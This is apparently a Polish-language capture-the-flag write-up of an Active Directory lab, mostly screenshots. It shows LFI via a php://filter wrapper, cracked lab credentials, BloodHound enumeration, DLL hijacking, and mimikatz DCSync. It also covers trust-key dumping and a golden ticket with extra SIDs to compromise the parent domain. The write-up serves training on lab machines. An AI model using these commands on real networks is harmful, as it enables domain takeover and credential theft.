200      GET      131l      390w     6084c http://10.10.229.150/dashboard/ru/howto.html
Scanning: http://10.10.229.150/
Scanning: http://10.10.229.150/DEV/
Scanning: http://10.10.229.150/Dashboard/
Scanning: http://10.10.229.150/Dev/
Scanning: http://10.10.229.150/DEV/css/
Scanning: http://10.10.229.150/DEV/images/
Scanning: http://10.10.229.150/Dev/images/
Scanning: http://10.10.229.150/Dev/css/
Scanning: http://10.10.229.150/IMG/
Scanning: http://10.10.229.150/Img/
Scanning: http://10.10.229.150/WEBALIZER/
Scanning: http://10.10.229.150/Webalizer/
Scanning: http://10.10.229.150/dashboard/
Scanning: http://10.10.229.150/dashboard/stylesheets/
Scanning: http://10.10.229.150/dashboard/images/
Scanning: http://10.10.229.150/dashboard/images/addons/
Scanning: http://10.10.229.150/dev/
Scanning: http://10.10.229.150/Dashboard/DE/
Scanning: http://10.10.229.150/Dashboard/DOCS/
Scanning: http://10.10.229.150/Dashboard/DOCS/images/
Scanning: http://10.10.229.150/Dashboard/De/
Scanning: http://10.10.229.150/Dev/Css/
Scanning: http://10.10.229.150/Dashboard/Docs/
Scanning: http://10.10.229.150/Dashboard/Docs/images/
Scanning: http://10.10.229.150/Dashboard/JP/
Scanning: http://10.10.229.150/DEV/Images/
Scanning: http://10.10.229.150/Dashboard/PL/
Scanning: http://10.10.229.150/Dashboard/StyleSheets/
Scanning: http://10.10.229.150/dashboard/DE/
Scanning: http://10.10.229.150/dashboard/De/
Scanning: http://10.10.229.150/dashboard/ES/
Scanning: http://10.10.229.150/dashboard/It/
Scanning: http://10.10.229.150/dashboard/JP/
Scanning: http://10.10.229.150/dashboard/Javascripts/
Scanning: http://10.10.229.150/dashboard/RO/
Scanning: http://10.10.229.150/dashboard/RU/
Scanning: http://10.10.229.150/dev/CSS/
Scanning: http://10.10.229.150/dev/Css/
Scanning: http://10.10.229.150/dev/IMAGES/
Scanning: http://10.10.229.150/Dashboard/fr/
Scanning: http://10.10.229.150/Dashboard/hu/
Scanning: http://10.10.229.150/dashboard/javascripts/
Scanning: http://10.10.229.150/dashboard/ru/                                                                                                                                                                                                                                                      
```

W sumie jedyne co wygląda ciekawie to `/dev/*`

![{53B08835-4B6C-4262-B5A2-E1F74D2E5F7E}](https://github.com/user-attachments/assets/a184d907-8150-4924-98a6-248df278c75b)

- xampp? :O

![{B1FBA6A1-D86D-497B-9D80-A872B1D7FC33}](https://github.com/user-attachments/assets/2988f371-14c2-4f9f-9401-255a5775c6d2)

O it looks interesting

Yes.. LFI

![{27F31FDF-E202-40CA-A27E-A60DD99E0DC7}](https://github.com/user-attachments/assets/85a38bee-fe39-4a29-89db-921e8db96c1f)

![{3AC6E752-9FC9-437D-81C2-F6CD47FBBAB3}](https://github.com/user-attachments/assets/9f13a78a-14e5-434f-94e1-01a39fd2e986)

![{3A8F02C7-949C-4875-B80B-218A65EFBC1F}](https://github.com/user-attachments/assets/b3fb2a24-8ba1-4f8a-a951-164b348f2f33)

a to też ciekawe

![{D32B8651-EDA6-4436-B3AD-2AADB4AB0C8E}](https://github.com/user-attachments/assets/faf40218-b393-4236-9b09-4218da508144)

przy okazji wiemy, że to php także ładujemy wrappery i może przeczytamy coś "ukrytego" w tym kodzie. W teorii brzmi to jak nie realistyczy przypadek, ale programiści często wrzucają dziwne rzeczy do kodu, bo "i tak nikt nie zobaczy".

![{DAD2BE04-6F22-461A-AA45-5BDAADC01E93}](https://github.com/user-attachments/assets/9dbe8886-be53-403e-804a-73c237f092a4)

Działa.

![{D60F46C8-4986-4FCB-867F-DC8872B1FBA4}](https://github.com/user-attachments/assets/f193aa31-0f24-463b-bd31-f179f1b91696)

Błąd mówi nam gdzie jesteśmy.

```
http://10.10.249.150/dev/index.html?view=php://filter/convert.base64-encode/resource=file://C:\xampp\htdocs\dev\index.html
```

![{E704C825-4A73-47B2-A138-403EFB7BC986}](https://github.com/user-attachments/assets/56ae3382-5bb1-490d-98d1-5471c7c24edb)

Po wykonaniu komendy na screeni dostajemy taki krótki fragment. Nic szczególnego, bo odkrytliśmy tą funkcjonalność moment temu.
Czas poszukać jakiś plików z content discovery. `db.php` wygląda dobrze

![{96189D78-77AC-40B1-AA2D-0063E505DFFD}](https://github.com/user-attachments/assets/f1a3fafc-0f19-4a0c-a7e5-b231effc348e)

![{A0379DE1-2180-4337-BC37-DA5F4CE1A901}](https://github.com/user-attachments/assets/cf755789-aea4-4f35-b77f-a0fcfc67bc8d)

Póki co tyle. Wracam jak coś fajnego będzie.

![{7E73F89C-DC67-4258-A845-35F9399FD383}](https://github.com/user-attachments/assets/5a91f0ea-1b17-41cb-ae27-0dec82d99bd1)

dobra to news było.
- jedno się złamało.

```
nxc smb 10.10.249.150 -u rsmith -p <dasz radę sam zrobić> 
```
- zero ciakawych sharów więc certipy/bloodhound

z jakiegoś powodu nie mogłem zrobić bloodhounda, ale rozwiązałem to tak
```
dnschef --fakeip 10.10.249.150
bloodhound-python -d 'LAB.TRUSTED.VL' -u 'rsmith' -p 'IHateEric2' -ns 127.0.0.1 -dc labdc.LAB.TRUSTED.VL -c all
```

![{132FC492-B0AA-4617-91D1-019A58740353}](https://github.com/user-attachments/assets/b60823b2-ebdc-47b2-8947-7ed261ff1aa4)

no to liniowo idziemy do EWALTERS

![1](https://github.com/user-attachments/assets/515e5b04-338c-48ac-a744-33d689423581)

jednakże widzimy, że ten user może PSRemote więc mamy wjazd na DCka z shellem w końcu.

![{ECAF2216-8865-4C40-BECC-F75DA714055D}](https://github.com/user-attachments/assets/d1e0cd32-b02b-44c4-b3a0-33f25ceea61c)

![{555FE816-F63E-42C7-A1ED-ABDB4A363123}](https://github.com/user-attachments/assets/6bef8f0b-5737-4ef7-895b-5e3ee4f0a502)

![{9D624D70-354F-49CA-A100-4690BDEA2F83}](https://github.com/user-attachments/assets/1d61f888-a8fe-4dc0-a12d-b32e2c140139)

![{1FAF21F4-FB34-49DD-AA2F-E4AA919F7BC5}](https://github.com/user-attachments/assets/625a39ae-49bc-41b2-b4c4-f86f694009f1)

- wysłalem plik przez smb.

![{EBD0F30B-9777-4598-82B0-4E5357084E0A}](https://github.com/user-attachments/assets/242ad2c7-e228-4f6a-a45b-d828dbdaf297)

oooo ciekawy folder

![{3E71819E-1BB9-4420-BA5A-C5E2DA3B96CB}](https://github.com/user-attachments/assets/ad335536-452b-40ce-8628-5297904c7ba6)

![{15E4F041-F9EE-4E20-8D70-BC337B4D5DB2}](https://github.com/user-attachments/assets/0fd6cac2-d507-455f-8285-a458ba52f110)

![{35B0CC79-C49B-4BCC-BFE4-36782F5E848F}](https://github.com/user-attachments/assets/87b6ffe9-dec7-4b2d-bc53-3550c2f18c95)

![{06E46AB3-B8EA-40E6-B439-4A011E56B27B}](https://github.com/user-attachments/assets/4af5658a-079e-4d94-b3a1-8c2782f1e1aa)

![{37A0F1DA-C596-456D-B722-424B91240BB0}](https://github.com/user-attachments/assets/851e080b-807d-495a-a5e7-e706a6c1c175)

o szuka dllek w swojej ścieżce czyli możemy filtrować po `NAME NOT FOUND`

![{158867F4-F5E6-4B5A-8474-E9DD958FCC63}](https://github.com/user-attachments/assets/4a87bc76-71e6-4a59-a391-c1f7076a8c6d)

![{9807BACE-2D5C-4C80-BEC2-12E9B7FD8445}](https://github.com/user-attachments/assets/70800069-99ef-4e24-ad4d-f569428e574b)

![{88C8F8FF-B7DF-4DCC-91BB-D49E3E7913E9}](https://github.com/user-attachments/assets/be489f38-0d10-4eee-81fa-6c44c4b10a49)

![{4FBB59D1-BF07-441F-A5AC-4EDB6877F333}](https://github.com/user-attachments/assets/7a66aa6e-540b-4d94-a47b-3a9f7af5a180)

- wrzuciłem i nic się nie dzieje. Możliwe, że coś przegapiłem :(

![{FBBE6206-742A-4B5A-9A1F-AA6508D36B9B}](https://github.com/user-attachments/assets/b61ce740-ee94-4090-ade9-6586d0b23f48)

dobra I AM BLIND i nie zauważyłem oczysitej dllki xd

![{1969259D-616E-46A1-8705-339D0B5276ED}](https://github.com/user-attachments/assets/ff13968a-7677-4071-85bd-27f1fe75d4b1)

![{144BED95-5342-4E07-A155-52163B972FC4}](https://github.com/user-attachments/assets/2e591245-7562-4c17-b950-656c6a0e49f5)

Dobra eskalacja na milion sposobów xD

![{CDDC604C-C854-4027-84DF-16BA82DA5930}](https://github.com/user-attachments/assets/7e4ca880-ef78-41f8-831d-ae671cd91329)

albo.. nie muszę eskalować xD

![{011F53D2-57EF-4A70-907B-591C6801A9D9}](https://github.com/user-attachments/assets/42425e5a-581b-499e-a783-89e9932f6a5e)

![{5D939401-BD55-4493-8537-CACFA8DE8DE6}](https://github.com/user-attachments/assets/bd80b390-bebe-4ac6-8d6f-07c9be779426)

dobra mamy DA w tej domenie.

![{79F4A06D-35A5-4D19-8DFC-D8A42B2BC8FA}](https://github.com/user-attachments/assets/76602176-f4cf-44ff-b16c-a2da25653b93)

trusty domenowe wygląda tak, ale to nie czytelne więc użyjemy trochę cmd
```
nltest.exe /trusted_domains
```



![{5FB00F25-5E32-4D09-A0BC-DE2DB6292860}](https://github.com/user-attachments/assets/2c68f242-fc2f-4708-be2e-653cb882c117)

Fajnie rzucić tam mimikatza i zrobić to przez GUI (tak malo redteamowo, ale to nie redteam xd)
```
xfreerdp /v:10.10.249.150 /u:bartek /p:'password1!' /drive:mimikatz

privilege::debug
lsadump::dcsync /domain:lab.trusted.vl /all

```

![{F2F8855B-067C-4CE6-A69B-3A60AF826B55}](https://github.com/user-attachments/assets/55a1a58e-477c-40b9-9f86-0ac1f3d4761d)

```
lsadump::trust /patch
```

![{92AC41AF-8CBE-4E8F-BF6B-C28755C193B4}](https://github.com/user-attachments/assets/65ec95d9-48bb-4c5f-8978-368712aa69a5)

```
 kerberos::golden /user:Administrator /krbtgt:<haszyk>d /domain:lab.trusted.vl /sid:<SID> /sids:<SIDS> /ptt
```

![{1BF27525-577A-49D9-A2CD-07F338D94F5A}](https://github.com/user-attachments/assets/771ebb08-0d81-4d24-ae2a-f86978fe7ef7)

```
lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all
```

![final](https://github.com/user-attachments/assets/d4606e9a-32c1-45f8-ab69-8ba1ce846600)

![dwa](https://github.com/user-attachments/assets/82dd205c-e70e-4572-af29-4435c93d6650)

![{B80C6FD0-8935-4939-B58C-C900BD0DA471}](https://github.com/user-attachments/assets/fb020f5f-535f-4f56-a94b-9c01debf5338)

i tyle.

albo nie :O

![{AA7CAA66-0F8A-40D6-ABB7-3B53C8794EDD}](https://github.com/user-attachments/assets/70833120-0556-4e1f-9734-4ac423d242cb)

![{7D6B121E-4865-44A3-9D1A-DC1DFC4B63BF}](https://github.com/user-attachments/assets/b121aead-5498-4b02-85e5-e5c485dc437c)

password is cracable

![{B983D97B-4142-4DE8-873B-8F7EDC460B24}](https://github.com/user-attachments/assets/cfd0f067-e0a9-4025-9899-e4c2c6ddff0f)

I got root flag but I dont get user

![{2058AE00-7421-404C-BD6D-6FC5D733033A}](https://github.com/user-attachments/assets/b5a45b09-ffd9-41b1-9b1f-6217c1d7a6a9)

dobra mam usera


